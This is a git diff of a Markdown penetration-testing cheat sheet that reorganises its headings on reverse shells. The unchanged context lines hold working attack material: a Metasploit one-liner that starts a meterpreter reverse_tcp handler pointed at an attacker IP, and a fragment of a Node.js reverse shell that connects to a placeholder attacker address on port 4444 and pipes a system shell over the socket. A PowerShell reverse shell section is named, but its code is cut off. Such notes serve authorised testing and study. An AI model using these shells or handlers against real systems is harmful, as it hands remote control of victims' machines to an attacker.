@@ -4,8 +4,9 @@
 
 ### Table of Contents
 - [Metasploit Handler Oneliner](#metasploit-handler-oneliner)
-- [Reverse Shell JavaScript](#reverse-shell-javascript)
-- [Reverse Shell PowerShell](#reverse-shell-powershell)
+- [Reverse Shells](#reverse-shells)
+  * [JavaScript](#javascript)
+  * [PowerShell](#powershell)
 
 ---
 
@@ -17,7 +18,10 @@
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <attacker_ip>;set LPORT <port>;run;"
 ```
 
-## Reverse Shell JavaScript
+## Reverse Shells
+- Different stuff related to reverse shells
+
+### JavaScript
 - Context specific, e.g. `nodejs` (here: without URL encode)
 
 ```js
@@ -34,7 +38,7 @@ client.connect(4444, "<attack_ip>", function(){client.pipe(sh.stdin);sh.stdout.p
 sh.stderr.pipe(client);});
 ```
 
-## Reverse Shell PowerShell
+### PowerShell
 - Simple oneliner for creating a `powershell` reverse shell
 
 ```powershell
